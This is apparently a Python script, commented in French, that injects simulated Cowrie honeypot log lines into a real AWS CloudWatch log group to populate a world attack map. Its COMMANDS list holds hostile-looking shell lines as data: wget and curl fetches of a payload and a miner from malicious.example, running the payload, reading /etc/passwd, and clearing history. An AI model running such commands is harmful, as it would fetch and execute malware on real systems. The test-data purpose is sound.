"""
Script de simulation d'attaques multi-localisations, pour tester le rendu
de la carte a l'echelle (Phase 2 - production fermee, AWS reel).

Contrairement a log_generator.py (Phase 1, pointe vers LocalStack), ce
script ecrit directement dans le VRAI CloudWatch Logs de ton compte AWS -
utilise le profil/credentials actuellement actifs dans ton terminal
(ex: $env:AWS_PROFILE = "honeypot-admin").

Format des lignes : le meme format texte que produit reellement Cowrie
(voir ADR-017/parse_cowrie_text_log dans main.tf) - PAS du JSON. La
Lambda d'enrichissement s'appuie sur une regex pour ce format precis :
    TIMESTAMP [composant,session,IP] MESSAGE
Seules les lignes "CMD: ..." sont classees cowrie.command.input et donc
comptees/affichees sur la carte (voir requete Athena de la carte,
volontairement restreinte a ce type d'evenement).

Rythme d'envoi volontairement etale (quelques secondes entre chaque IP) :
- reste tres en dessous de la limite de 45 requetes/minute d'ip-api.com
  (chaque IP inedite declenche un vrai appel externe cote Lambda)
- donne un effet "accumulation progressive" ideal pour une video acceleree
"""

import boto3
import json
import random
import time
from datetime import datetime, timezone

# ------------------------------------------------------------------------------
# Connexion AWS reelle (region Paris, cohérente avec le reste du projet)
# ------------------------------------------------------------------------------
cw_logs = boto3.client("logs", region_name="eu-west-3")

LOG_GROUP = "/aws/ec2/cowrie"
LOG_STREAM = "attack-simulation-multi-locations"

# ------------------------------------------------------------------------------
# IP publiques reelles, reparties sur plusieurs continents, pour peupler
# la carte a l'echelle mondiale. Les libelles de pays sont indicatifs
# (meilleure estimation) : la geolocalisation reelle depend de la base
# d'ip-api.com au moment de la requete, qui peut differer legerement.
# ------------------------------------------------------------------------------
ATTACK_IPS = [
    ("8.8.8.8", "Etats-Unis"),
    ("4.2.2.2", "Etats-Unis"),
    ("200.160.2.3", "Bresil"),
    ("185.220.101.5", "Allemagne"),
    ("212.27.48.10", "France"),
    ("81.2.69.142", "Royaume-Uni"),
    ("145.100.0.1", "Pays-Bas"),
    ("62.75.0.1", "Allemagne"),
    ("5.61.16.1", "Russie"),
    ("116.31.116.1", "Chine"),
    ("133.242.0.1", "Japon"),
    ("128.199.0.1", "Singapour"),
    ("103.21.244.1", "Inde"),
    ("196.25.1.1", "Afrique du Sud"),
    ("1.0.0.1", "Australie"),
    ("210.181.1.1", "Coree du Sud"),
    ("41.79.0.1", "Kenya"),
]

USERNAMES = ["root", "admin", "support", "ubuntu", "user", "test", "oracle"]
PASSWORDS = ["123456", "password", "admin123", "root", "1234", "qwerty", "toor"]
COMMANDS = [
    "whoami", "uname -a", "cat /etc/passwd", "ls -la /", "id",
    "wget http://malicious.example/payload.sh", "chmod +x payload.sh",
    "./payload.sh", "ps aux", "netstat -an", "history -c",
    "cat /proc/cpuinfo", "curl -s http://malicious.example/miner",
]

DELAY_MIN_SECONDS = 1.5
DELAY_MAX_SECONDS = 3.5


def ensure_log_stream_exists():
    try:
        cw_logs.create_log_stream(logGroupName=LOG_GROUP, logStreamName=LOG_STREAM)
    except cw_logs.exceptions.ResourceAlreadyExistsException:
        pass


def build_command_line(ip):
    """
    Construit une ligne au format texte Cowrie (celui reellement capture,
    voir ADR-017), classee cowrie.command.input par la regex de la Lambda.
    """
    timestamp = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")
    session_id = "".join(random.choices("0123456789abcdef", k=12))
    command = random.choice(COMMANDS)
    return f"{timestamp} [ssh,{session_id},{ip}] CMD: {command}"


def build_login_line(ip):
    """Ligne de tentative de connexion (pour varier un peu le realisme)."""
    timestamp = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")
    session_id = "".join(random.choices("0123456789abcdef", k=12))
    user = random.choice(USERNAMES)
    pwd = random.choice(PASSWORDS)
    success = random.random() < 0.3
    verb = "succeeded" if success else "failed"
    return f"{timestamp} [HoneyPotSSHTransport,0,{ip}] login attempt [{user}/{pwd}] {verb}"


def send_single_event(message):
    ensure_log_stream_exists()
    res = cw_logs.describe_log_streams(
        logGroupName=LOG_GROUP,
        logStreamNamePrefix=LOG_STREAM
    )
    token = res["logStreams"][0].get("uploadSequenceToken")

    kwargs = {
        "logGroupName": LOG_GROUP,
        "logStreamName": LOG_STREAM,
        "logEvents": [{"timestamp": int(time.time() * 1000), "message": message}],
    }
    if token:
        kwargs["sequenceToken"] = token

    cw_logs.put_log_events(**kwargs)


def run_multi_location_simulation():
    print(f"Simulation de {len(ATTACK_IPS)} attaques, reparties sur plusieurs continents.")
    print(f"Rythme : {DELAY_MIN_SECONDS}-{DELAY_MAX_SECONDS}s entre chaque IP (reste sous la limite ip-api.com).\n")

    for i, (ip, country_hint) in enumerate(ATTACK_IPS, start=1):
        # Une connexion + une tentative de login + 1 a 3 commandes, pour
        # un profil d'attaque un peu plus realiste qu'un seul evenement.
        send_single_event(build_login_line(ip))
        time.sleep(0.4)

        nb_commands = random.randint(1, 3)
        for _ in range(nb_commands):
            send_single_event(build_command_line(ip))
            time.sleep(0.4)

        print(f"[{i}/{len(ATTACK_IPS)}] {ip} ({country_hint}) - {nb_commands} commande(s) envoyee(s)")

        if i < len(ATTACK_IPS):
            time.sleep(random.uniform(DELAY_MIN_SECONDS, DELAY_MAX_SECONDS))

    print("\nSimulation terminee. Laisse quelques secondes au pipeline "
          "(CloudWatch -> Lambda -> S3) avant de rafraichir la carte.")


if __name__ == "__main__":
    run_multi_location_simulation()
